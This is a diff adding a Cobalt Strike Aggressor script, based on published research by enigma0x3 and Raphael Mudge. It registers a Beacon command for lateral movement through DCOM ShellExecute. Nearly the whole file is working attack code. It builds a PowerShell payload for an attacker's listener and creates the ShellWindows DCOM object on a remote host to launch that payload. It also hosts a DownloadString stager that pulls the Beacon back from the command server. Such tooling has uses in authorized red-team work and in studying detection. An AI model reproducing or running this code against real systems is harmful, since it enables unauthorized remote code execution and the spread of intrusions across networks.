@@ -1,0 +1,49 @@
+# Lateral movement techniques based on research by enigma0x3 (Matt Nelson)
+# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
+# https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
+# Beacon implementation based on comexec.cna by Raphael Mudge
+# https://gist.github.com/rsmudge/8b2f699ea212c09201a5cb65650c6fa2
+
+# Register alias
+beacon_command_register ("dcom_shellexecute", "Lateral movement with DCOM (ShellExecute)",
+                        "Usage: dcom_shellexecute [target] [listener]\n\n" .
+                        "Spawn new Beacon on a target via DCOM ShellExecute Object.");
+
+# Alias for dcom_shellexecute
+alias dcom_shellexecute {
+    if ($3 is $null) {
+        # If no listener specified, allow user to choose
+        openPayloadHelper(lambda({
+            dcom_shellexecute($bid, $target, $1);
+                                }, $bid => $1, $target => $2));
+    }
+    else {
+        dcom_shellexecute($1, $2, $3);
+    }
+}
+
+sub dcom_shellexecute {
+    local('$payload $cmd');
+
+    # Acknowledge task
+    btask($1, "Tasked Beacon to run (" . listener_describe($3, $2) . ") via DCOM ShellExecute");
+
+    # Generate PowerShell one-liner for payload
+    $payload = powershell($3, true, "x86");
+    $payload = strrep($payload, "powershell.exe ", "");
+
+    # Create new DCOM ShellExecute object on remote host
+    $cmd = '[Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "';
+    $cmd .= $2;
+    $cmd .= '")).Item().Document.Application.ShellExecute("powershell.exe", "';
+    $cmd .= $payload;
+    $cmd .= '", "C:\Windows\System32\WindowsPowershell\v1.0",';
+    $cmd .= '$null,0)';
+
+    # Use beacon_host_script to generate a shorter DownloadString
+    # payload that we can use w/ make_token
+    $short = beacon_host_script($1, $cmd);
+
+    bpowershell($1, $short);
+}
+
